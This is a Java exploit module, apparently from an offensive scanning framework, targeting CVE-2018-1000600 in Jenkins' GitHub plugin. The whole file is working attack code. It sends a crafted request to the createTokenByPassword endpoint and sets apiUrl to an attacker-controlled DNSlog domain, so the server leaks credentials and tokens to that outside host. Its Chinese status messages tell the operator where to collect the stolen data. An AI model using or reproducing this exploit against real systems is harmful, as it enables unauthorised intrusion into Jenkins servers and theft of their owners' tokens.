package fun.fireline.exp.jenkins;

import fun.fireline.core.ExploitInterface;
import fun.fireline.exp.tools.dnslogSetting;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Jenkins_Info;
import fun.fireline.tools.Response;

import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static fun.fireline.tools.Tools.dnslog_verify;
import static fun.fireline.tools.Tools.getRandomString;

public class CVE_2018_1000600 implements ExploitInterface {

    private String exp = "/securityRealm/user/username/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=";
    private String url = "";
    private boolean isVul = false;
    private HashMap<String,String> headers = new HashMap<>();
    private Jenkins_Info jenkins_info = new Jenkins_Info();
    private dnslogSetting dnslogSetting = new dnslogSetting();

    @Override
    public String checkVul(String url) {
        this.url = url;
        String version = jenkins_info.get_Jenkions_Info(url);
        if(version==null){
            return "[-] 目标非Jenkins";
        }
        String dnslog = dnslogSetting.getDomain();
        if(dnslog==null){
            return "请进行dnslog配置";
        }
        String random = getRandomString(3);
        this.exeCmd("test","UTF-8");
        if(dnslog_verify(dnslogSetting,random)){
            this.isVul = true;
            return "[+] 目标可能存在CVE-2018-1000600 Jenkins GitHub SSRF+信息泄露漏洞,已经测试出一个存在的用户名test,可以在"+random+"."+dnslog+"获取到敏感信息,请在文件读取/命令执行模块提供用户名 eg:test";
        }
        return "[?] 目标可能存在CVE-2018-1000600 Jenkins GitHub SSRF+信息泄露漏洞,但需要提供一个已经存在用户名,请在文件读取/命令执行模块提供用户名进行验证 eg:user1 (username)";
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        exp = exp.replace("username",cmd);
        String dnslog = dnslogSetting.getDomain();
        String random = getRandomString(3);
        Response response = HttpTools.get(this.url+exp+random+"."+dnslog,this.headers,"UTF-8");
        if(response.getCode()==200){
            if(response.getText().contains("Created")){
                return "SSRF成功,请从"+random+"."+dnslog+"接受泄露的信息";
            }
        }
        return "SSRF失败,该目标可能不存在CVE-2018-1000600 Jenkins GitHub SSRF+信息泄露漏洞";
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
